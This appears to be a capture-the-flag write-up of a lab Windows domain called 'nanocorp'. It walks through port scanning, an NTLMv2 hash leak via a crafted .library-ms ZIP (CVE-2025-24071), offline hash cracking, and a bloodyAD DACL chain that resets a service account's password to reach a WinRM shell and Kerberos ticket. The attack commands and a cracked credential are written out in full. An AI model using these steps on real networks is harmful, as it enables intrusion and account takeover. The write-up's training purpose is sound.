## Reconnaissance

Port enumeration is performed to identify the services exposed by the target.

```bash
nmap -sC -sV -Pn -p- --open -T4 10.10.11.93 --stats-every=5s -oN scan.txt
```

The results show a PHP/Apache web service alongside **Check_MK**, an unusual service to find exposed on this kind of host. The domain name is added to `/etc/hosts` to allow proper name resolution and access to the webpage.

## Enumeration

Web enumeration is prioritized first, since it is generally the most direct path to an initial foothold. A subdomain is identified on the web application.

![subdomain discovered during web enumeration](/assets/images/nanocorp/Pasted-image-20251115131345.png)
*Subdomain identified on the web application*

This subdomain exposes a ZIP file upload feature.

![ZIP upload functionality discovered](/assets/images/nanocorp/Pasted-image-20251115131638.png)
*ZIP upload feature exposed by the application*

The webpage uses a PHP backend to process uploaded ZIP files, which makes this functionality an important target for exploitation.

### Check_MK Review

**Check_MK** is a monitoring solution for IT infrastructure. Through it, configuration paths and the process list can be reviewed. The service is found to be running as `NANOCORP\web_svc`, suggesting this account is the likely target for the initial foothold.

It is also noted that an RDP session is running under this service account. A service account should never run an interactive RDP session — this strongly suggests the account was misused by an administrator, which means its password is likely weak enough to be cracked.

## Exploitation — CVE-2025-24071

The combination of a ZIP upload feature and a service account that may be coerced into authenticating points toward an exploit involving `.library-ms` files: [CVE-2025-24071 PoC](https://github.com/0x6rss/CVE-2025-24071_PoC).

**CVE-2025-24071** abuses how Windows Explorer automatically processes `.library-ms` files inside extracted ZIP archives. A `.library-ms` file can reference a remote SMB share; when Explorer indexes the extracted folder, it automatically attempts to connect to that share, leaking the current user's NTLMv2 authentication hash to an attacker-controlled SMB listener — with no user interaction beyond the file being extracted/viewed.

Uploading the crafted exploit ZIP triggers a connection to an attacker-controlled SMB share, capturing the NTLMv2 hash for `web_svc`.

![NTLMv2 hash captured via the SMB listener](/assets/images/nanocorp/Pasted-image-20251115160333.png)
*NTLMv2 hash captured from the triggered SMB authentication attempt*

## Credential Access

The captured NTLMv2 hash is cracked offline with Hashcat.

```bash
hashcat -a0 -m5600 hash.txt /usr/share/wordlists/rockyou.txt
```

This recovers valid credentials for the `web_svc` user.

## Active Directory Enumeration

With valid domain credentials, internal Active Directory enumeration begins using **BloodHound**.

```bash
bloodhound-python -c All -d nanocorp.htb -u 'web_svc' -p 'dksehdgh712!@#' -ns 10.129.111.122 --zip
```

> If a `dns.resolver.LifetimeTimeout` error occurs, it usually indicates a clock skew between the attacking machine and the Domain Controller. The DC's time can be retrieved with `ntpdate` and used to synchronize the local clock before retrying.

Reviewing the collected data in the BloodHound GUI reveals a **DACL (Discretionary Access Control List)** abuse chain:

**`WEB_SVC@NANOCORP.HTB`** → `AddSelf` → **`IT_SUPPORT@NANOCORP.HTB`** → `ForceChangePassword` → **`MONITORING_SVC@NANOCORP.HTB`** → `MemberOf` → **`REMOTE MANAGEMENT USERS@NANOCORP.HTB`**

> `web_svc` can add itself to the `IT_SUPPORT` group via the `AddSelf` permission. Members of `IT_SUPPORT` can use `ForceChangePassword` to reset the password of `monitoring_svc` without knowing its current value. `monitoring_svc` is in turn a member of `REMOTE MANAGEMENT USERS`, a group that grants WinRM access to the host.

## Privilege Escalation — DACL Abuse Chain

### Step 1 — AddSelf

[BloodyAD](https://github.com/CravateRouge/bloodyAD) is used to perform the LDAP modifications required for the attack. First, `web_svc` adds itself to the `IT_SUPPORT` group.

```bash
bloodyAD --host 10.10.11.93 -d nanocorp.htb -u web_svc -p 'dksehdgh712!@#' add groupMember IT_SUPPORT web_svc
```

### Step 2 — ForceChangePassword

Now a member of `IT_SUPPORT`, the password for `monitoring_svc` is reset to a known value.

```bash
bloodyAD --host 10.10.11.93 -d nanocorp.htb -u web_svc -p 'dksehdgh712!@#' set password monitoring_svc 'P@ssw0rd123!'
```

### Step 3 — WinRM Access

As `monitoring_svc` is a member of `REMOTE MANAGEMENT USERS`, **evil-winrm** can be used to obtain an interactive shell on the Domain Controller.

```bash
evil-winrm -i dc.nanocorp.htb -u monitoring_svc -p 'P@ssw0rd123!'
```

## Kerberos Authentication — Time Synchronization

Kerberos authentication requires the attacking machine's clock to be closely synchronized with the Domain Controller's clock. **faketime** is used to wrap the Kerberos TGT request with the DC's current time, avoiding the need to permanently change the system clock.

```bash
sudo faketime "$(ntpdate -q dc.nanocorp.htb | cut -d ' ' -f 1,2)" impacket-getTGT 'nanocorp.htb'/'monitoring_svc':'P@ssw0rd123!' -dc-ip 10.10.11.93
```

This returns a valid TGT for `monitoring_svc`. The resulting ticket cache is exported to the `KRB5CCNAME` environment variable so subsequent Kerberos-authenticated tools use it automatically.

```bash
export KRB5CCNAME=$(pwd)/monitoring_svc.ccache
```
